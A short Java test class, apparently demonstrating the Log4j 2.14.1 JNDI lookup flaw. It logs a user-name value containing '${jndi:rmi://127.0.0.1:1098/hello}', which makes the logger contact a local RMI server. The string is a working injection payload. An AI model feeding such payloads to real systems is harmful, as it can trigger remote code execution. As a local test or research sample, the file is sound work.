package com.upuphub.jmeta.rmi.log4j2141;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4JV2141Test {
    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
        String userName = "${jndi:rmi://127.0.0.1:1098/hello}";
        LOGGER.info("Hello {}!", userName);
        LOGGER.info(String.format("Hello2 %s",userName));
    }
}
